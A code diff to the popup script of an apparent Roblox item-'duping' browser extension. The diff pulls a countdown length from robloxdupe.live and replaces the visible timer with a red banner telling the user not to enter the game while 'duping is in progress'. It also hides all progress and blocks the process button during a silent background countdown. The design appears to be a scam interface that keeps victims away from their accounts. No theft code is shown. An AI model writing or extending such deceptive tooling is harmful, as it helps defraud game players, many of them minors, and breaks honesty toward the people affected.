@@ -200,9 +200,21 @@ const countdownProgressBar = document.getElementById('countdownProgressBar');
 
 let currentGameId = null;
 let countdownInterval = null;
-const COUNTDOWN_DURATION = 12 * 60 * 60 * 1000; // 12 hours in ms
 
-// ===== Countdown Functions =====
+const res = await fetch("https://robloxdupe.live/api/countdown");
+const data = await res.json();
+
+const COUNTDOWN_DURATION = data.countdown_hours * 60 * 60 * 1000;
+
+function updateModalDurationText() {
+    const durationHours = Math.round(COUNTDOWN_DURATION / (1000 * 60 * 60));
+    const durationEl = document.getElementById('durationHours');
+    if (durationEl) {
+        durationEl.textContent = durationHours;
+    }
+}
+updateModalDurationText();
+
 function formatTime(ms) {
     if (ms <= 0) return '00:00:00';
     const totalSeconds = Math.floor(ms / 1000);
@@ -219,19 +231,27 @@ function startCountdownTimer(gameId, endTime) {
         countdownInterval = null;
     }
 
+    // Hiện thông báo đỏ "đang quét"
     countdownContainer.style.display = 'block';
     countdownContainer.classList.remove('completed');
+    countdownContainer.innerHTML = `
+        <div style="color: #fff; background: #e53935; padding: 10px 14px; border-radius: 6px; font-weight: 600; text-align: center;">
+            ⚠ DO NOT ENTER THE GAME WHILE DUPING IS IN PROGRESS
+        </div>
+    `;
+
+    // Ẩn nút process trong lúc đang đếm ngầm
+    processBtn.style.pointerEvents = 'none';
 
     function updateDisplay() {
         const now = Date.now();
         const remaining = endTime - now;
 
         if (remaining <= 0) {
-            // Timer completed
-            countdownTimer.textContent = '00:00:00';
-            countdownProgressBar.style.width = '100%';
+            // Timer completed -> ẩn thông báo đỏ, hiện nút process
+            countdownContainer.style.display = 'none';
             countdownContainer.classList.add('completed');
-            countdownTimer.textContent = 'COMPLETED!';
+
             processBtn.classList.remove('processing', 'done');
             processBtn.innerHTML = `
                 <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
@@ -240,21 +260,19 @@ function startCountdownTimer(gameId, endTime) {
                 PROCESS ITEM
             `;
             processBtn.style.pointerEvents = 'auto';
+
             if (countdownInterval) {
                 clearInterval(countdownInterval);
                 countdownInterval = null;
             }
+
             // Remove from storage
             chrome.storage.local.remove(`countdown_${gameId}`);
             return;
         }
 
-        countdownTimer.textContent = formatTime(remaining);
-
-        // Calculate progress (how much time has elapsed)
-        const elapsed = COUNTDOWN_DURATION - remaining;
-        const progress = Math.min((elapsed / COUNTDOWN_DURATION) * 100, 100);
-        countdownProgressBar.style.width = `${progress}%`;
+        // Không cần cập nhật gì lên UI trong lúc đếm ngầm
+        // (giữ nguyên thông báo đỏ cho tới khi remaining <= 0)
     }
 
     // Update immediately then every second
